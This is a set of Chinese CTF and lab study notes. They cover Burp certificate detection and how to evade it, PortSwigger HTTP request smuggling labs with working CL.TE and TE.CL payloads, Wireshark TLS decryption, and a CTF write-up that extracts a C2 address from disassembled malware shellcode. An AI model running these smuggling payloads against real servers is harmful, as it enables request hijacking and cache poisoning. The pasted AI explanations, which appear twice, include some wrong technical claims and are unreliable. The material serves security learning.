防御者的应对措施如果攻击者（你）的钓鱼服务器检测到Burp证书，可以采取以下策略：\n\n记录并阻断：记录IP或会话，后续请求直接返回错误（如 403 Forbidden）。\n返回虚假数据：向Burp用户返回误导性信息（如伪造的登录页面）。\n触发警报：通知安全团队有测试人员&#x2F;攻击者在探测系统。\n\n\n3. 如何绕过检测？（攻击者视角）如果攻击者希望避免被钓鱼服务器检测到Burp证书，可尝试：\n\n禁用Burp的CA证书：\n\n在Burp Suite 中关闭 Proxy → Options → TLS Pass Through，避免拦截特定域名。\n\n\n使用真实浏览器代理：\n\n通过 Chrome + SwitchyOmega 转发流量到Burp，保留原生TLS指纹。\n\n\n修改TLS指纹：\n\n使用插件（如 Bypass TLS Fingerprinting）模拟浏览器行为。\n\n\n删除敏感HTTP头：\n\n在Burp的 Match and Replace 规则中删除 Via、X-Forwarded-For 等头。\n\n\n\n\n总结\n\n\n检测手段\n攻击者如何绕过\n\n\n\n检查证书链（Burp CA签发）\n禁用Burp拦截或使用合法证书\n\n\nTLS指纹（JA3&#x2F;JA3S）\n模拟浏览器指纹或使用真实浏览器代理\n\n\nHTTP头（如 Via: burp）\n删除或修改敏感头字段\n\n\n证书透明度（CT日志）\n无法绕过（需使用合法CA证书）\n\n\n公钥指纹比对\n使用目标域名的真实证书（如SSL剥离攻击）\n\n\n关键结论\nBurp Suite 的证书容易被检测：因其CA名称、TLS指纹、HTTP头等特征明显。\n高安全目标系统（如银行）：通常会启用证书固定+JA3检测，Burp直接拦截会失败。\n隐蔽性建议：尽量模拟合法流量，或使用更底层的流量劫持工具（如 mitmproxy + 自定义TLS栈）。\n\n","categories":["协议学习"],"tags":["tls"]},{"title":"burpsuitlab_http走私","url":"/2025/03/16/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/burpsuite_lab/http_requests_smuglling/","content":"http请求走私\n高质量文章\n学好此文，国家赠送金手铐和职业套装，数年管吃管住-HTTP请求夹带（HTTP request smuggling）_请求夹带是什么-CSDN博客\nWEB安全-金手铐系列-HTTP&#x2F;2高级请求夹带攻击–Advanced request smuggling_response queue poisoning via h2.te request smuggli-CSDN博客\n\nhttp版本区别http 1.1\nhttp 1.1支持pipline就是支持在一个http包中放入两个请求,比如上面一个POST下面一个GET, 比如说上面是合法包,下面是payload. 前端只检测了合法包就通过了这个http请求包就会让payload在后端加载. \nkeepalive当出现这个就是告诉服务器http请求没有请求完,就会把刚才没法完的内容接上去\n\nhttp 2\n使用Transfer-Encoding,当出现0\\r\\n\\r\\n，也就是0和两个回车（如代码块）就结束了\n0\n\n\n\nhttp头格式区别\n:method \tGET:path \t/anything:authority \tvulnerable-website.com:scheme \thttps://evil-user.net/poison?\n\n出现原因\n现代大型网络多采用前后端分离技术(front-end back-end),就是设置了类似负载均衡(负载均衡、反向代理、网关等)和后面的服务端分离的架构,这些服务在链路上起到了一个转发请求给后端服务器的作用，因为位置位于后端服务器的前面，所以本文把他们称为前端服务器。\n\n实际上主要Connect的设置主要是延长服务器中缓存的停留时间, 如果keep-alive不同的中间件或者网关会设置不同的通信时间, 如果设置时间内一直没有收到新的消息, 则也会主动关闭. 但是缓存中对于上一个包的消息中的干扰消息(对于完整的HTTP报文已经读取,还留下没有被认为完全传输的,但实际上适用于干扰的信息)不会立刻删除, 而是按照指定时间删除, 而且一般在上一个包中模棱两可的东西也会干扰服务器对这个连接的关闭判断从而延长关闭. 当服务器缓存中有这个东西, 而有发送了一个新的包的时候就可以继续运行了. 所以和Keep-Alive与Closed没有本质关系而是与是否缓存被删除有关系. \n\n同时对于HTTP 1.1来说,默认使用的就是Keep-Alive,如果不经过特殊设置得到的就是这个. \n所以说对于Connect的设置并不是必要的\n\n\n对数据包的结束的判断标准\n\n使用Content-Length进行判断, header中标记Content-Length有多长,就按照这个来截取数据包(使用burp repeater可以自动计算长度,但是在实际开始应用的时候关闭这个功能burp -&gt; send旁边 -&gt; Update Connect Length)\n\n使用Transfer-Encoding进行判断,当包中最后一个是0时认为数据包结束, Transfer-Encoding 头则可以声明消息体使用了 chunked 编码，就是消息体被拆分成了一个或多个分块传输，每个分块的开头是当前分块大小（以十六进制表示），后面紧跟着 \\r\\n，然后是分块内容，后面也是 \\r\\n。消息的终止分块也是同样的格式，只是其长度为零。例如：\nPOST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedbq=smuggling0\n\n\n当前后端对包的结束点确认方法不同的时候出现http请求走私漏洞(http requests smuglling)\n\nHTTP 规范为了避免这种歧义，其声明如果 Content-Length 和 Transfer-Encoding 同时存在，则 Content-Length 应该被忽略。\n\n某些服务器不支持请求中的 Transfer-Encoding 头。\n\n某些服务器虽然支持 Transfer-Encoding 头，但是可以通过某种方式进行混淆，以诱导不处理此标头。\n\n如果前端服务器（转发服务）和后端服务器处理 Transfer-Encoding 的行为不同，则它们可能在连续请求之间的边界上存在分歧，从而导致请求走私漏洞。就是构造一个GPOST包,就是一个包包含GET请求有包含POST请求\n\n\n元宝解释从tcp链路层角度的漏洞出现原因在通过TCP传输HTTP报文时，设备（如代理服务器、负载均衡器或目标服务器）解析HTTP报文的方式取决于TCP的流式传输特性以及HTTP协议本身的设计。以下是详细的解答：\n\nTCP的流式传输特性​\tTCP是一个面向流的协议，它将应用层的数据视为一个连续的字节流（byte stream），而不关心数据的具体边界。TCP会将应用层的数据分段（segmentation）传输，并在接收端重新组装这些段（reassembly）。因此，TCP本身并不保留应用层数据的边界信息。\n\n发送端：TCP将HTTP报文分成多个TCP段（segments），每个段的大小受限于最大报文段长度（MSS）和网络路径的MTU（最大传输单元）。\n接收端：接收方会根据TCP的序列号将这些段重新组装成一个完整的字节流。\n\n\nHTTP协议的解析方式​\tHTTP协议是基于文本的协议，它依赖于请求行、请求头和请求体的特定格式来解析报文。HTTP协议的解析是在应用层完成的，而不是在TCP层。\n\nHTTP&#x2F;1.1：HTTP&#x2F;1.1是基于文本的协议，请求报文和响应报文由明确的边界（如换行符\\r\\n）分隔。接收方需要从TCP的字节流中解析出完整的HTTP报文。\nHTTP&#x2F;2：HTTP&#x2F;2是二进制协议，报文被分割成帧（frames），每帧都有明确的类型和长度。接收方需要按照HTTP&#x2F;2的帧结构解析报文。\n事实上从这里就可以看出不同版本对于边间分隔的区别, 这也是漏洞成因\n\n\n设备如何解析HTTP报文？​\t设备在解析HTTP报文时，通常是从TCP的字节流中逐步读取数据，并根据HTTP协议的规则解析出完整的报文。具体过程如下：\n （1）逐段读取TCP数据\n\nTCP层会将接收到的TCP段交给应用层（如HTTP协议栈）。\n应用层会从TCP的字节流中逐步读取数据，直到解析出一个完整的HTTP请求或响应。\n\n （2）根据HTTP协议规则解析\n\nHTTP&#x2F;1.1：应用层会查找\\r\\n\\r\\n（请求头和请求体之间的分隔符）或\\r\\n（请求行和请求头之间的分隔符），以确定请求的边界。\nHTTP&#x2F;2：应用层会根据帧的类型和长度字段解析出完整的帧，并将这些帧重新组装成HTTP报文。\n\n （3）处理不完整的报文\n\n如果接收到的TCP段不足以组成一个完整的HTTP报文，设备会等待更多的TCP段到达，直到解析出完整的报文为止。\n这种等待可能会导致延迟，尤其是在网络条件较差或攻击者故意发送不完整请求的情况下。\n\n\n是否需要等待整个HTTP包的TCP碎片？​\t答案是：不需要等待整个HTTP包的所有TCP碎片到达，但需要等待一个完整的HTTP报文被解析出来。\n\nTCP层的特性：TCP会将所有属于同一个连接的段按顺序交付给应用层，因此应用层可以逐步读取数据并解析。\nHTTP层的特性：HTTP协议的解析依赖于报文的完整性（如请求行、请求头和请求体的分隔符），因此应用层必须等待足够的数据到达，才能解析出一个完整的HTTP报文。\n\n\nHTTP请求走私与解析方式的关系​\tHTTP请求走私攻击利用了TCP的流式传输特性和HTTP协议的解析方式之间的不一致性。具体来说：\n\n代理服务器和目标服务器的解析差异：代理服务器和目标服务器可能对同一个TCP字节流有不同的解析结果。例如，代理服务器可能认为一个请求已经完整，而目标服务器认为该请求尚未结束。\n不完整的HTTP报文：攻击者可以故意发送不完整的HTTP报文，利用TCP的分段传输特性，使得代理服务器和目标服务器对请求的解析结果不同。\n\n\n\n总结\n\n\nTCP层：TCP将HTTP报文分段传输，并在接收端重新组装成一个字节流。设备不需要等待所有TCP段到达，但需要等待一个完整的HTTP报文被解析出来。\nHTTP层：HTTP协议的解析依赖于报文的完整性，因此设备需要从TCP的字节流中逐步读取数据，直到解析出一个完整的HTTP报文。\nHTTP请求走私：攻击者利用TCP的分段传输特性和HTTP协议的解析方式之间的不一致性，构造出模棱两可的请求，导致代理服务器和目标服务器对请求的解析结果不同。\n\n这种解析方式的差异是HTTP请求走私攻击的核心原因之一。元宝解释从tcp链路层角度的漏洞出现原因\n在通过TCP传输HTTP报文时，设备（如代理服务器、负载均衡器或目标服务器）解析HTTP报文的方式取决于TCP的流式传输特性以及HTTP协议本身的设计。以下是详细的解答：\n\nTCP的流式传输特性​\tTCP是一个面向流的协议，它将应用层的数据视为一个连续的字节流（byte stream），而不关心数据的具体边界。TCP会将应用层的数据分段（segmentation）传输，并在接收端重新组装这些段（reassembly）。因此，TCP本身并不保留应用层数据的边界信息。\n\n发送端：TCP将HTTP报文分成多个TCP段（segments），每个段的大小受限于最大报文段长度（MSS）和网络路径的MTU（最大传输单元）。\n接收端：接收方会根据TCP的序列号将这些段重新组装成一个完整的字节流。\n\n\nHTTP协议的解析方式​\tHTTP协议是基于文本的协议，它依赖于请求行、请求头和请求体的特定格式来解析报文。HTTP协议的解析是在应用层完成的，而不是在TCP层。\n\nHTTP&#x2F;1.1：HTTP&#x2F;1.1是基于文本的协议，请求报文和响应报文由明确的边界（如换行符\\r\\n）分隔。接收方需要从TCP的字节流中解析出完整的HTTP报文。\nHTTP&#x2F;2：HTTP&#x2F;2是二进制协议，报文被分割成帧（frames），每帧都有明确的类型和长度。接收方需要按照HTTP&#x2F;2的帧结构解析报文。\n事实上从这里就可以看出不同版本对于边间分隔的区别, 这也是漏洞成因\n\n\n设备如何解析HTTP报文？​\t设备在解析HTTP报文时，通常是从TCP的字节流中逐步读取数据，并根据HTTP协议的规则解析出完整的报文。具体过程如下：\n （1）逐段读取TCP数据\n\nTCP层会将接收到的TCP段交给应用层（如HTTP协议栈）。\n应用层会从TCP的字节流中逐步读取数据，直到解析出一个完整的HTTP请求或响应。\n\n （2）根据HTTP协议规则解析\n\nHTTP&#x2F;1.1：应用层会查找\\r\\n\\r\\n（请求头和请求体之间的分隔符）或\\r\\n（请求行和请求头之间的分隔符），以确定请求的边界。\nHTTP&#x2F;2：应用层会根据帧的类型和长度字段解析出完整的帧，并将这些帧重新组装成HTTP报文。\n\n （3）处理不完整的报文\n\n如果接收到的TCP段不足以组成一个完整的HTTP报文，设备会等待更多的TCP段到达，直到解析出完整的报文为止。\n这种等待可能会导致延迟，尤其是在网络条件较差或攻击者故意发送不完整请求的情况下。\n\n\n是否需要等待整个HTTP包的TCP碎片？​\t答案是：不需要等待整个HTTP包的所有TCP碎片到达，但需要等待一个完整的HTTP报文被解析出来。\n\nTCP层的特性：TCP会将所有属于同一个连接的段按顺序交付给应用层，因此应用层可以逐步读取数据并解析。\nHTTP层的特性：HTTP协议的解析依赖于报文的完整性（如请求行、请求头和请求体的分隔符），因此应用层必须等待足够的数据到达，才能解析出一个完整的HTTP报文。\n\n\nHTTP请求走私与解析方式的关系​\tHTTP请求走私攻击利用了TCP的流式传输特性和HTTP协议的解析方式之间的不一致性。具体来说：\n\n代理服务器和目标服务器的解析差异：代理服务器和目标服务器可能对同一个TCP字节流有不同的解析结果。例如，代理服务器可能认为一个请求已经完整，而目标服务器认为该请求尚未结束。\n不完整的HTTP报文：攻击者可以故意发送不完整的HTTP报文，利用TCP的分段传输特性，使得代理服务器和目标服务器对请求的解析结果不同。\n\n\n\n总结\n\n\nTCP层：TCP将HTTP报文分段传输，并在接收端重新组装成一个字节流。设备不需要等待所有TCP段到达，但需要等待一个完整的HTTP报文被解析出来。\nHTTP层：HTTP协议的解析依赖于报文的完整性，因此设备需要从TCP的字节流中逐步读取数据，直到解析出一个完整的HTTP报文。\nHTTP请求走私：攻击者利用TCP的分段传输特性和HTTP协议的解析方式之间的不一致性，构造出模棱两可的请求，导致代理服务器和目标服务器对请求的解析结果不同。\n\n这种解析方式的差异是HTTP请求走私攻击的核心原因之一。\n攻击类型分类CL.TE类型构造在同一个包构建payload如下，注意需要将repeater -&gt; inspector -&gt; request attributes中设置成HTTP 1.1\nPOST / HTTP/1.1Host: 0af8004a0423e250ed7a600b00780090.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 35Transfer-Encoding: chunked0GET /404 HTTP/1.1X-Ignore: X\n\n对于前端服务器来说就是完整的35个长度的包放过去了(Content-Length)\n但是对于后端服务器来说,到0就结束了 后面的会被存留在服务器中, 有下一个请求过来就会以为是这个GET的请求,将会被直接返回\nbp官方思路  Content-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding: chunked0G\n\n  构造GPOST 前端服务器使用TE,到0就截止了,不会吧G传给后端服务器,而是在那里等着tcp的下一步连接.\n  下次上传的POST就会和这个G结合变成GPOST,因为不和规范而报错\nCSDN思路  POST / HTTP/1.1Host: vulnerable-website.comContent-Length: 3Transfer-Encoding: chunked8SMUGGLED0\n\n  此种情况下，前端服务器支持Transfer-Encoding标头，会将消息体视为分块编码方式，它处理第一个长度为8字节的数据块，内容是SMUGGLED，之后解析处理第二个块，它是0长度，因此解析终止。该请求转发到后端服务器后，由于后端服务器采用Content-Length标头，按照其中请求主体长度的3个字节，解析会执行到8之后的行开头，所以SMUGGLED及以下的内容就不会被处理，后端服务器会将余下内容视为请求序列中下一个请求的起始。\n插件http requests smugllingGET / HTTP/2Host: 0a8b0024034d275a817c028c009b00d3.web-security-academy.netAccept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36Connection: closeCache-Control: max-age=0: path: /: path: /\n\n\nHTTP 2伪头部特殊性\n在 HTTP&#x2F;2 协议中，伪头部（如 :method、:path、:authority）是强制且唯一的，用于定义请求的核心元数据。若请求中重复出现伪头部（例如你的请求中有两个 :path），理论上应被拒绝。但在实际场景中，部分服务器（尤其是降级为 HTTP&#x2F;1.x 的代理）可能未严格校验，导致以下问题：\n\n前端与后端解析不一致：前端代理可能仅处理第一个 :path，而后端服务器可能取最后一个或拼接两者，导致路径歧义。\n\n降级时的意外行为：HTTP&#x2F;2 伪头部在降级为 HTTP&#x2F;1.x 时需转换为请求行和 Host 头。若存在重复伪头部，降级逻辑可能生成异常的 HTTP&#x2F;1.x 请求行（如\nGET / /asdfwrtz HTTP/1.1\n\n），触发后端路由错误.\n\n\n\nTE.CL类型POST / HTTP/1.1\\r\\nHost: 0a4f00cf03ea9b488e09b69300ff009f.web-security-academy.net\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n5c\\r\\nGPOST / HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0\\r\\n\\r\\n\n\n\n","categories":["打靶日记","burpsuitelab"],"tags":["web漏洞"]},{"title":"hacktb_ctf流量分析","url":"/2025/04/09/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/hacktb/ctf%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","content":"ctf流量分析常用方法\ntcp是一块一块的,eq1,2,3,4,5就是可以查看不同的流\ntcp.stream eq 3\n\n右键-&gt; 追踪流-&gt; TCP Stream可以查看一个完整的tcp流过程细节\n\n正常是搜索http然后按照2来查找\n\n\ntls流\n查找tls发现不能查看任何东西,是因为需要sslkeylog来解密\n\n找到这个sslkeylog之后格式如下(在这个题目中在某个tcp流中存在这个sslkeylog的明文,复制下来如下)\nSERVER_HANDSHAKE_TRAFFIC_SECRET 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 994da7436ac3193aff9c2ebaa3c072ea2c5b704683928e9f6e24d183e7e530386c1dcd186b9286f98249b4dc90d8b795EXPORTER_SECRET 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 31882156a3212a425590ce171cb78068ee63e7358b587fed472d45d67ea567d98a079c84867a18665732cf0bfe18f0b0SERVER_TRAFFIC_SECRET_0 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 1fbf7c07ca88c7c91be9cce4c9051f2f4bd7fb9714920661d026119ebab458db8637089348dd5a92dc75633bdcf43630CLIENT_HANDSHAKE_TRAFFIC_SECRET 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 a98fab3039737579a50e2b3d0bbaba7c9fcf6881d26ccf15890b06d723ba605f096dbe448cd9dcc6cf4ef5c82d187bd0CLIENT_TRAFFIC_SECRET_0 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 646306cb35d94f23e125225dc3d3c727df65b6fcec4c6cd77b6f8e2ff36d48e2b7e92e8f9188597c961866b3b667f405\n\n\n\n在本题中解密完再次搜索tls找到一张照片\n\n\n使用 ## wireshark分离文件将图片提取出来\n\n\nwireshark加载sslkeylog\n打开 Wireshark，加载你的抓包文件（File → Open）。\n\n进入 TLS 配置：\n\n点击菜单栏 Edit(编辑) → Preferences(首选项)。\n在左侧选择 Protocols，找到并展开 TLS（或 SSL，取决于 Wireshark 版本）。\n\n\n设置(Pre)-Master-Secret log filename\n\n点击右侧的 Browse 按钮，选择你的 sslkeylog.txt 文件。\n确保勾选 Reassemble TLS records spanning multiple TCP segments（优化解密）。\n\n\n点击 OK 保存设置。\n\n\nwireshark分离文件[使用Wireshark提取流量中图片方法_wireshark提取图片-CSDN博客](https://blog.csdn.net/imtech/article/details/134575827\t\n\nwireshark直接导出文件-&gt; 导出对象 -&gt;http选择有图片的那个包,导出 可以直接保存为png\n\n找到Portable Network Graphics显示分组字节\n\n\n\n\nftp格式查找传输了什么东西\nftp-data\n\n追踪tcp流,感觉像是一个zip的文件,下面的编码选择原始数据&#x2F;HEX,不要使用ASCII,然后保存导出得到1.zip\n\n过滤出httpstcp.port == 443 &amp;&amp; tls\n\n\n\n\n添加ssc.key\n进入 TLS 配置：\n\n点击菜单栏 Edit(编辑) → Preferences(首选项)。\n在左侧选择 RSA密钥，找到add new keyfile...\n\n\n选择对应的密钥文件\n\n\ntelnet查找报文中的东西有什么用tcp.port == 23 &amp;&amp; frame contains &quot;key1&quot;\n\n","categories":["打靶日记","hacktb"],"tags":["wireshark"]},{"title":"hacktb_第八届西湖论剑_sharkp","url":"/2025/04/20/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/hacktb/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91_sharkp/","content":"第八届西湖论剑_sharkp参考wp: \n​\tiot 逆向思路:西湖论剑WriteUp | CN-SEC 中文网\n​\tweb思路: 西湖论剑 By 金石滩小鲨鱼 | Ya1orin🍭\n​\t官方wp: 第八届西湖论剑·中国杭州网络安全技能大赛初赛官方Write Up（上）\n流量分析法\n恶意文件可以使用在线安全沙箱来分析出恶意ip\n\n导出文件(又记了一次_悲_)(但是实际上这次不在这里):\n首先确认恶意文件是在http中上传的,然后就可以使用导出对象找到对应协议\n可以看到这里面有好几个协议,选择http\n\n然后wireshark就会过滤出所有的http协议中有的内容,然后上选择对应的目标文件setFirmwareUpgrade另存\n\n\n\n\n\n   然后是大大的教训\n\n\n沙箱\n安恒云沙箱-下一代沙箱的领航者\n样本报告-微步在线云沙箱\n奇安信情报沙箱\n\n与他人wp中hash相同但是一直无法检测出外联行为,无法进行,疑似木马检测了时间,设置了发送时间限制,故无法从沙箱中判断\n\n所以需要尝试逆向来进行ip获取\n\n\n逆向解法\nf5将汇编翻译成c语言\n\n\n搜索syscall 0x40404发现上下文\n.shellcode:00410114                 syscall 0x40404.shellcode:00410118                 move    $s5, $v0.shellcode:0041011C                 bnez    $v0, main_lab.shellcode:00410120                 nop.shellcode:00410124                 li      $t9, 0xFFFFFFFD.shellcode:00410128                 nor     $a0, $t9, $zero.shellcode:0041012C                 li      $t9, 0xFFFFFFFD.shellcode:00410130                 nor     $a1, $t9, $zero.shellcode:00410134                 slti    $a2, $zero, -1.shellcode:00410138                 li      $v0, 0x1057.shellcode:0041013C                 syscall 0x40404.shellcode:00410140                 sw      $v0, var_4($sp).shellcode:00410144                 lw      $s0, var_4($sp).shellcode:00410148                 li      $t9, 0x47DDFFFD.shellcode:00410150                 nor     $t1, $t9, $zero.shellcode:00410154                 sw      $t1, var_8($sp).shellcode:00410158                 li      $t1, 0xA158C373.shellcode:00410160                 sw      $t1, var_4($sp).shellcode:00410164                 addiu   $sp, -8.shellcode:00410168                 sw      $s0, 8+var_10+4($sp)\n\nai发现注入了\n.shellcode:00410158  li $t1, 0xA158C373    # 写入魔数.shellcode:00410160  sw $t1, var_4($sp)    # 存储到栈\n\n0xA158C373转化过来是\n\n对于1010 0001 0101 1000 1100 0011 0111 0011,ip地址的编码规则是8位二进制分,解析出来是\n161.88.195.115,实际上答案应该是:115.195.88.161\n\n存在字节序问题\n你发现了一个关键细节！0xA158C373 在不同字节序下会解析出不同的 IP 地址。以下是完整解释：\n\n1. 根本原因：字节序（Endianness）问题0xA158C373 是 32位十六进制值，但它在内存中的存储方式取决于 CPU 的字节序：\n\n大端序（Big-Endian）：高位字节在前 → A1 58 C3 73 → 161.88.195.115（人类直觉顺序，网络传输标准）\n小端序（Little-Endian）：低位字节在前 → 73 C3 58 A1 → 115.195.88.161（x86&#x2F;ARM等常见CPU的默认顺序）\n\n\n2. 你的代码场景分析(1) MIPS架构的字节序\nMIPS CPU 可能是大端或小端（取决于具体型号）：\n\n如果你在 小端序 MIPS 系统（或模拟器）中运行代码，0xA158C373 会被当作 73 C3 58 A1 解析 → 115.195.88.161。\n\n\n\n\n\n\n如果是 大端序 MIPS，则解析为 161.88.195.115。\n\n(2) 指令中的隐式转换   当代码执行以下操作时：\n   li  $t1, 0xA158C373    # 将值加载到寄存器   sw  $t1, var_4($sp)    # 存储到内存\n\nli 指令：直接加载 0xA158C373 到寄存器，不改变字节序。\n\nsw 指令：将寄存器的值按当前CPU字节序写入内存。\n\n\n\n\n3. 如何验证正确的IP？(1) 动态调试检查   在调试器中查看 $t1 寄存器的实际字节排列：\n   (gdb) x/4xb $t1    # 显示$t1的4个字节   0x73 0xc3 0x58 0xa1  # 小端序 → 115.195.88.161\n(2) 代码上下文\n如果后续代码将 $t1 作为 网络数据包 发送（如通过 sendto），需按 大端序（网络字节序） 转换：\nli    $t1, 0xA158C373swl   $t1, 0($sp)     # 强制按大端序存储\n此时IP为 161.88.195.115。\n\n如果直接用于 本地计算（如加密密钥），则保持小端序 115.195.88.161。\n\n\n收集wireshark使用方法http.request.method == &quot;POST&quot;\n\n过滤出二进制流传输判断传输了文件\nhttp.content_type == &quot;application/octet-stream&quot;\n\n\n\n教训\n遇到意义不明的二进制流放沙箱! 是否改后缀无所谓,但是一定要通过导出对象\n\n另存为只能获得txt!\n获取response返回的文件\nhttp.content_type == &quot;application/octet-stream&quot;\n\n找到之后选择另存为\n\n总结发现这个另存为只会被识别为text!\n\n\n","categories":["打靶日记","hacktb"],"tags":["wireshark"]},{"title":"hacktb_应急响应SU_forensics","url":"/2025/04/18/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/hacktb/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94SU_forensics/","content":"SU_forensics\n参考链接 2025 XCTF国际网络攻防联赛-SUCTF分站赛 Misc Writeup - ⚡Lunatic BLOG⚡\n\n注意过程获取的按压缩包解压后是一个vm虚拟机文件,存在两个处理方式:\n\n直接使用vm虚拟机打开\n\n使用DiskGenius挂载虚拟机磁盘\n\n\n\nDiskGenius恢复删除文件,可能可以找出对应的日志文件\n/home/bkfish/.bash_history\n\n如果无法使用windows打开可以尝试使用linux来查看\nexport HISTFILE=./.bash_historyhistory -c                        # 清空当前历史history -rhistory\n\n\n\n网页镜像查询\nhttps://web.archive.org/\n\n有意思的解题过程\n思路：将图片切割后分类成小图片，统计每个小图片的次数之后直接替换成对应的26个字母，也就是说把替换后的字母放入原来小图片的位置生成一个文本然后使用词频统计来解密出原来的明文\n\n词频统计 + 逆向推理（谁不在）https://www.quipqiup.com/\n\n破解替换密码（存在一个密码本对每一个字母进行随即替换：A-&gt;N,B-&gt;C诸如此类，但是英语使用的时候字母的频率是固定的，因此存在词频分析）\n输入值（存在27种除了26个字母外看空格也算，但是正常最多的应该就是空格）\nA BCDEF GHIJKL MNOP QHRDST UAVW XDYVLHU ZIHEDANDGHU DS WJH XOM OV YAFDST QHLK BAMANDZWDE PAR WOKZZDR VLHSGDHU FDSTZ QOPHU WO AMONDZJ YK BCDWH IDWDVCN XOCZWZYAK XO HBCAN YK VOONDZJ LHEOLU MK ZONQDST ZDR ICGGNHZ A PHHFJALLK DZ XOTTDST BCDEFNK PJDEJ ARHU GHS YOSFZ PDWJ AMCSUASW QAIOLUCYIK FDMDWGHL XDSTNHZ AZ BCDROWDE OQHLVNOPZSKYIJ ZDST VOL BCDEF XDTZ QHR MCU DS GHZWVCN WPDNDTJWZDYINH VOR JHNU BCALWG UCEF XCZW MK PDSTZWLOST MLDEF BCDG PJASTZ XCYIK VOR QDQDUNKTJOZWZ DS YHYOLK IDEFZ CI BCALWG ASU QANCAMNH OSKR XHPHNZIHSZDQH PDGALUZ YAFH WORDE MLHP VOL WJH HQDN BAWALD FDST ASU PLK XAEFANN OCWUAWHU BCHLK AZFHU MK VDQH PAWEJ HRIHLWZ AYAGHU WJH XCUTH\n\n输出值\nA QUICK ZEPHYR BLOW VEXING DAFT JIMFRED SPECIALIZED IN THE JOB OF MAKING VERY QABALISTIC WAX TOYSSIX FRENZIED KINGS VOWED TO ABOLISH MY QUITE PITIFUL JOUSTSMAY JO EQUAL MY FOOLISH RECORD BY SOLVING SIX PUZZLES A WEEKHARRY IS JOGGING QUICKLY WHICH AXED ZEN MONKS WITH ABUNDANT VAPORDUMPY KIBITZER JINGLES AS QUIXOTIC OVERFLOWSNYMPH SING FOR QUICK JIGS VEX BUD IN ZESTFUL TWILIGHTSIMPLE FOX HELD QUARTZ DUCK JUST BY WINGSTRONG BRICK QUIZ WHANGS JUMPY FOX VIVIDLYGHOSTS IN MEMORY PICKS UP QUARTZ AND VALUABLE ONYX JEWELSPENSIVE WIZARDS MAKE TOXIC BREW FOR THE EVIL QATARI KING AND WRY JACKALL OUTDATED QUERY ASKED BY FIVE WATCH EXPERTS AMAZED THE JUDGE\n\n\n\n实际上输出结果有多种可能(结果需要根据每一行的字母数量手动换行)，但是实际上每一种都对应一个算法并且都是不一样的结果，所以一般要用第一个，第一个的算法推荐度更高\nO CHARK PEMZID VLUB FEQANG YOJT WAX JDEY SMERAOLAPEY AN TZE WUV UJ XOKANG FEDI COVOLASTAR BOQ TUIS SAQ JDENPAEY KANGS FUBEY TU OVULASZ XI CHATE MATAJHL WUHSTS XOI WU ECHOL XI JUULASZ DERUDY VI SULFANG SAQ MHPPLES O BEEK ZODDI AS WUGGANG CHARKLI BZARZ OQEY PEN XUNKS BATZ OVHNYONT FOMUD YHXMI KAVATPED WANGLES OS CHAQUTAR UFEDJLUBS NIXMZ SANG JUD CHARK WAGS FEQ VHY AN PESTJHL TBALAGZT SAXMLE JUQ ZELY CHODTP YHRK WHST VI BANG STDUNG VDARK CHAP BZONGS WHXMI JUQ FAFAYLI GZUSTS AN XEXUDI MARKS HM CHODTP ONY FOLHOVLE UNIQ WEBELS MENSAFE BAPODYS XOKE TUQAR VDEB JUD TZE EFAL COTODA KANG ONY BDI WORK OLL UHTYOTEY CHEDI OSKEY VI JAFE BOTRZ EQMEDTS OXOPEY TZE WHYGE\n\nO CHARK PEMZID VLUB FEQANG YOJT WAX --&gt; SJDEY SMERAOLAPEY AN TZE WUV UJ XOKANG FEDI COVOLASTAR BOQ TUIS --&gt;HSAQ JDENPAEY KANGS FUBEY TU OVULASZ XI CHATE MATAJHL WUHSTS --&gt; RYXOI WU ECHOL XI JUULASZ DERUDY VI SULFANG SAQ MHPPLES O BEEK  --&gt; TZODDI AS WUGGANG CHARKLI BZARZ OQEY PEN XUNKS BATZ OVHNYONT FOMUD --&gt; JYHXMI KAVATPED WANGLES OS CHAQUTAR UFEDJLUBS --&gt;RZNIXMZ SANG JUD CHARK WAGS FEQ VHY AN PESTJHL TBALAGZT  --&gt; OSAXMLE JUQ ZELY CHODTP YHRK WHST VI BANG --&gt; FSTDUNG VDARK CHAP BZONGS WHXMI JUQ FAFAYLI --&gt; EGZUSTS AN XEXUDI MARKS HM CHODTP ONY FOLHOVLE UNIQ WEBELS --&gt; JMENSAFE BAPODYS XOKE TUQAR VDEB JUD TZE EFAL COTODA KANG ONY BDI WORK --&gt; HOLL UHTYOTEY CHEDI OSKEY VI JAFE BOTRZ EQMEDTS OXOPEY TZE WHYGE --&gt; N\n\n\n\n仔细观察这个格式可以想到一个比较经典的Pangram(全字母句子)：\nThe quick brown fox jumps over the lazy dog\n\n因此把每一行中缺少的那个字母组合起来即可得到最后flag：SUCTF{HAVEFUN}\n也就是每一行中都有26个字母，少的那个就是希望的字母\n对于统计图片有着不同操作方式：\n哈希统计，对截取的图片求哈希，虽然在这里可以，因为都是有相同的图片合并来的，但是容错率太低\n\n✅ 优点\n(1) 